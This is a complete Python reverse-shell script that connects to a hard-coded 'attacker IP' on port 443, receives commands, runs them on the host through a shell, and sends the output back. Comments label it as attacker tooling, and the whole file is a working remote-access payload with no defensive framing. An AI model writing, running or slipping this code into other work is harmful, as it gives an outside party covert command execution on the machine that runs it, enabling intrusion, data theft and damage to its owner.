#!/usr/bin/python
import socket, subprocess, os, sys  # import libraries

HOST = '192.168.0.136'  # attacker IP
PORT = 443  # attacker port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # create TCP socket object
s.connect((HOST, PORT))  # add HOST and PORT parameters to TCP socket object

s.send(str.encode("Connection established! Ctrl+C to quit\n"))  # send message to attacker if connection is established

while 1:  # infinite loop
    data = s.recv(1024).strip()  # receive data from target
    data = data.decode()  # convert received data from bytes to string

    # for file navigation and manipulation in target computer
    try:
        cmd, params = data.split(" ", 1)
        if cmd == "cd":
            os.chdir(params)
            s.send("#> ".encode())
            continue
    except:
        pass

    # to send data to target computer via piping
    os.environ["PYTHONUNBUFFERED"] = "1"    #disabling buffering
    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    while proc.poll() is None:
        output = proc.stdout.readline()
        s.send(output)

    s.send(str.encode("#>"))

# terminate program if user press "Ctrl + C"
s.close()
